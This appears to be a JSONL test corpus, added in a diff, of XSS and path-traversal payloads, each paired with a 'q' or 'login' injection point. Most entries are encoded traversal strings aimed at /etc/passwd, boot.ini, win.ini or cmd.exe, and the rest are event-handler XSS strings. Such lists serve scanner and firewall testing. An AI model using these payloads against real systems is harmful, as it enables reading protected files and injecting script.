+{"id": "xss-05e1f920-login", "payload": "<var draggable=\"true\" ondrag=\"alert(1)\">test</var>", "injection_point": "login", "fragment": false}
+{"id": "xss-1f2fb582-q", "payload": "<wbr draggable=\"true\" ondragleave=\"alert(1)\">test</wbr>", "injection_point": "q", "fragment": false}
+{"id": "xss-1f2fb582-login", "payload": "<wbr draggable=\"true\" ondragleave=\"alert(1)\">test</wbr>", "injection_point": "login", "fragment": false}
+{"id": "xss-f8e13922-q", "payload": "<wbr id=x tabindex=1 onbeforedeactivate=alert(1)></wbr><input autofocus>", "injection_point": "q", "fragment": false}
+{"id": "xss-f8e13922-login", "payload": "<wbr id=x tabindex=1 onbeforedeactivate=alert(1)></wbr><input autofocus>", "injection_point": "login", "fragment": false}
+{"id": "xss-dac7698f-q", "payload": "<wbr oncopy=\"alert(1)\" contenteditable>test</wbr>", "injection_point": "q", "fragment": false}
+{"id": "xss-dac7698f-login", "payload": "<wbr oncopy=\"alert(1)\" contenteditable>test</wbr>", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-eefc2bbe-q", "payload": "%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-eefc2bbe-login", "payload": "%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-fe7918f1-q", "payload": "%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-fe7918f1-login", "payload": "%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-1e34832c-q", "payload": "%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-1e34832c-login", "payload": "%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-d6aad809-q", "payload": "%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-d6aad809-login", "payload": "%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-3cb7d470-q", "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-3cb7d470-login", "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-a605a9c3-q", "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-a605a9c3-login", "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-f40c5704-q", "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-f40c5704-login", "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-49514050-q", "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-49514050-login", "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd;index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-f5154e9f-q", "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-f5154e9f-login", "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-2ec2e042-q", "payload": "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-2ec2e042-login", "payload": "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-cc25d69e-q", "payload": "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd%00index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-cc25d69e-login", "payload": "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd%00index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-ad7735e3-q", "payload": "%252e%252e/%252e%252e//etc/passwd;index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-ad7735e3-login", "payload": "%252e%252e/%252e%252e//etc/passwd;index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-ce5f3ea5-q", "payload": "%252e%252e/boot.ini;index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-ce5f3ea5-login", "payload": "%252e%252e/boot.ini;index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-0e026d06-q", "payload": "%252e%252e\\%252e%252e\\boot.ini;index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-0e026d06-login", "payload": "%252e%252e\\%252e%252e\\boot.ini;index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-41a67a71-q", "payload": "%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-41a67a71-login", "payload": "%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-0dbb2aa4-q", "payload": "%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-0dbb2aa4-login", "payload": "%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-9c1031d0-q", "payload": "%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-9c1031d0-login", "payload": "%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-3b97c700-q", "payload": "%25c0%25ae%25c0%25ae\\/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-3b97c700-login", "payload": "%25c0%25ae%25c0%25ae\\/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-58195129-q", "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-58195129-login", "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-8aab46a5-q", "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-8aab46a5-login", "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-fc39aefc-q", "payload": "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-fc39aefc-login", "payload": "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-5a3a53f4-q", "payload": "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-5a3a53f4-login", "payload": "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-112867bd-q", "payload": "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-112867bd-login", "payload": "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-c6c1f692-q", "payload": "%2e%2e%5c/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-c6c1f692-login", "payload": "%2e%2e%5c/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-202ebb1c-q", "payload": "%2e%2e%5cboot.ini;index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-202ebb1c-login", "payload": "%2e%2e%5cboot.ini;index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-c3d8c36f-q", "payload": "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-c3d8c36f-login", "payload": "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-22b9edbe-q", "payload": "%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-22b9edbe-login", "payload": "%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-77e4f2e4-q", "payload": "%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\boot.ini;index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-77e4f2e4-login", "payload": "%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\boot.ini;index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-e915e50e-q", "payload": "%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\/etc/passwd%00index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-e915e50e-login", "payload": "%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\/etc/passwd%00index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-e6bfd29f-q", "payload": "%2e%2e\\boot.ini;index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-e6bfd29f-login", "payload": "%2e%2e\\boot.ini;index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-f51c297b-q", "payload": "%2e%68%74%61%63%63%65%73%73", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-f51c297b-login", "payload": "%2e%68%74%61%63%63%65%73%73", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-bd109e0b-q", "payload": "%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-bd109e0b-login", "payload": "%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-c25ffee6-q", "payload": "%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e//etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-c25ffee6-login", "payload": "%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e//etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-02057f3b-q", "payload": "%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-02057f3b-login", "payload": "%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-265ec89e-q", "payload": "%c0%2e%c0%2e\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-265ec89e-login", "payload": "%c0%2e%c0%2e\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-78c27340-q", "payload": "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-78c27340-login", "payload": "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-cabb2702-q", "payload": "%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-cabb2702-login", "payload": "%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-954e1190-q", "payload": "%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-954e1190-login", "payload": "%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-6ab007f3-q", "payload": "%uff0e%uff0e%u2216boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-6ab007f3-login", "payload": "%uff0e%uff0e%u2216boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-0375ce8f-q", "payload": "..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-0375ce8f-login", "payload": "..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-c5d7df2b-q", "payload": "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd%00index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-c5d7df2b-login", "payload": "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd%00index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-af15bb8b-q", "payload": "..%252f..%252f..%252f..%252fboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-af15bb8b-login", "payload": "..%252f..%252f..%252f..%252fboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-855051ff-q", "payload": "..%252f..%252f..%252f..%252fboot.ini;index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-855051ff-login", "payload": "..%252f..%252f..%252f..%252fboot.ini;index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-d620b317-q", "payload": "..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd%00index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-d620b317-login", "payload": "..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd%00index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-556a4824-q", "payload": "..%255c..%255c..%255c..%255c..%255c..%255cboot.ini%00index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-556a4824-login", "payload": "..%255c..%255c..%255c..%255c..%255c..%255cboot.ini%00index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-ce30ab12-q", "payload": "..%255c..%255cboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-ce30ab12-login", "payload": "..%255c..%255cboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-df28cfba-q", "payload": "..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25afboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-df28cfba-login", "payload": "..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25afboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-d183f7e6-q", "payload": "..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259cboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-d183f7e6-login", "payload": "..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259cboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-77f07245-q", "payload": "..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-77f07245-login", "payload": "..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-59dee6a2-q", "payload": "..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259cboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-59dee6a2-login", "payload": "..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259cboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-bc4f4faf-q", "payload": "..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-bc4f4faf-login", "payload": "..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-2bbcea92-q", "payload": "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd;index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-2bbcea92-login", "payload": "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd;index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-f8eebd5c-q", "payload": "..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd%00index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-f8eebd5c-login", "payload": "..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd%00index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-968adac1-q", "payload": "..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-968adac1-login", "payload": "..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-44c7c3bf-q", "payload": "..%2f..%2f/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-44c7c3bf-login", "payload": "..%2f..%2f/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-ea5fc3ed-q", "payload": "..%5c..%5cboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-ea5fc3ed-login", "payload": "..%5c..%5cboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-35e699c5-q", "payload": "..%5cboot.ini%00index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-35e699c5-login", "payload": "..%5cboot.ini%00index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-c85c8018-q", "payload": "..%c1%9c..%c1%9c..%c1%9c/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-c85c8018-login", "payload": "..%c1%9c..%c1%9c..%c1%9c/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-ebac46cc-q", "payload": "..%c1%9c/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-ebac46cc-login", "payload": "..%c1%9c/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-a9332b2c-q", "payload": "..%u2216..%u2216..%u2216..%u2216..%u2216boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-a9332b2c-login", "payload": "..%u2216..%u2216..%u2216..%u2216..%u2216boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-a5ac30c4-q", "payload": "..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-a5ac30c4-login", "payload": "..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-8126dd98-q", "payload": "..%uEFC8/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-8126dd98-login", "payload": "..%uEFC8/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-74147b50-q", "payload": "........................................................................../..//etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-74147b50-login", "payload": "........................................................................../..//etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-fc9e176c-q", "payload": "..........................................................................\\..\\..\\..\\..\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-fc9e176c-login", "payload": "..........................................................................\\..\\..\\..\\..\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-d03902ac-q", "payload": "..../..../..../..../..../..../..../....//etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-d03902ac-login", "payload": "..../..../..../..../..../..../..../....//etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-ed5630c7-q", "payload": "..../..../boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-ed5630c7-login", "payload": "..../..../boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-0d2d78e8-q", "payload": "...\\...\\...\\...\\...\\...\\...\\...\\/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-0d2d78e8-login", "payload": "...\\...\\...\\...\\...\\...\\...\\...\\/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-7cf79a80-q", "payload": "...\\...\\...\\...\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-7cf79a80-login", "payload": "...\\...\\...\\...\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-55452f02-q", "payload": "../../../../../../../..//etc/passwd%00index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-55452f02-login", "payload": "../../../../../../../..//etc/passwd%00index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-6ed0df54-q", "payload": "../../../../../../..//etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-6ed0df54-login", "payload": "../../../../../../..//etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-1cbe93f2-q", "payload": "../../../..//etc/passwd%00index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-1cbe93f2-login", "payload": "../../../..//etc/passwd%00index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-9cf3b78c-q", "payload": "../..///boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-9cf3b78c-login", "payload": "../..///boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-e0599a3b-q", "payload": "..//..//..//..//..//..//..//..//boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-e0599a3b-login", "payload": "..//..//..//..//..//..//..//..//boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-b905c4f6-q", "payload": "..//..//..//..///etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-b905c4f6-login", "payload": "..//..//..//..///etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-c2df0d94-q", "payload": "..///..///..///..///..///..///..////etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-c2df0d94-login", "payload": "..///..///..///..///..///..///..////etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-426bc4c5-q", "payload": "..///..///boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-426bc4c5-login", "payload": "..///..///boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-1a4a7f32-q", "payload": "..//etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-1a4a7f32-login", "payload": "..//etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-b5f8a2b3-q", "payload": "..0x2f..0x2fboot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-b5f8a2b3-login", "payload": "..0x2f..0x2fboot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-95be70b6-q", "payload": "..0x5c/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-95be70b6-login", "payload": "..0x5c/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-b3b121c8-q", "payload": "..\\..\\..\\..\\..\\/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-b3b121c8-login", "payload": "..\\..\\..\\..\\..\\/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-cb5da8c1-q", "payload": "..\\..\\..\\..\\..\\boot.ini%00index.html", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-cb5da8c1-login", "payload": "..\\..\\..\\..\\..\\boot.ini%00index.html", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-e2c554f4-q", "payload": "..\\..\\..\\/etc/passwd", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-e2c554f4-login", "payload": "..\\..\\..\\/etc/passwd", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-1ec1b09a-q", "payload": "..\\..\\\\..\\..\\\\..\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-1ec1b09a-login", "payload": "..\\..\\\\..\\..\\\\..\\boot.ini", "injection_point": "login", "fragment": false}
+{"id": "path-traversal-a6f73c2c-q", "payload": "..\\..\\\\\\boot.ini", "injection_point": "q", "fragment": false}
+{"id": "path-traversal-a6f73c2c-login", "payload": "..\\..\\\\\\boot.ini", "injection_point": "login", "fragment": false}
